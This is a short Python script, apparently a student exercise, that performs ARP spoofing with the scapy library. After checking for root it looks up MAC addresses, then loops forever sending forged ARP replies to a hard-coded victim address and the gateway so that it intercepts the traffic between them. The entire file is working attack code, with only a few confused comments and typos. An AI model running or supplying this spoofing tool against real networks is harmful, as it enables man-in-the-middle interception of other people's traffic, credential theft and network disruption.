#!/usr/bin/env python

# arp_spoofing.py

from scapy.all import ARP, send, Ether, srp
import	time
import	sys
import	os

def e_print(msg, newline):
    RED = "\033[91m"
    RESET = "\033[0m"
    if newline:
        print(f"{RED}{msg}{RESET}")
    else:
        print(f"{RED}{msg}{RESET}", end="")

def s_print(msg, newline):
    GREEN = "\033[92m"
    RESET = "\033[0m"
    if newline:
        print(f"{GREEN}{msg}{RESET}")
    else:
        print(f"{GREEN}{msg}{RESET}", end="")

def w_print(msg, newline):
    YELLOW = "\033[93m"
    RESET = "\033[0m"
    if newline:
        print(f"{YELLOW}{msg}{RESET}")
    else:
        print(f"{YELLOW}{msg}{RESET}", end="")

def	is_root():
	id = os.geteuid()
	if (id != 0):
		w_print("[!] You must run this script as root", newline=True)
		sys.exit(1)

# >>> in get_mac_addr function help us to get the mac addr of the target
def	get_mac_addr(ip):
	request = ARP(pdst=ip)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	packet = broadcast/request
	answered, _ = srp(packet, timeout=1, verbose=False)
	if answered:
		return (answered[0][1].hwsrc)
	return None

# target_ip => destination of the packer (victim ip)
# traget_mac => get the mac of the victim ip
# spoof_ip => is the ip of the routure
def spoof(target_ip, spoof_ip):
    target_mac = get_mac_addr(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # the op=2?? what is means
    send(packet, verbose=False)

def main():
    is_root()
    # 10.32.80.1 this is the ip of the getway
    # 0.32.86.160 this is the ip of the victim
    while True:
        # the first line is a fake reply to the victim(10.32.86.160)
        spoof("10.32.86.160", "10.32.80.1")
        spoof("10.32.80.1", "10.32.86.160")
        time.sleep(2)

if __name__ == "__main__":
    main()
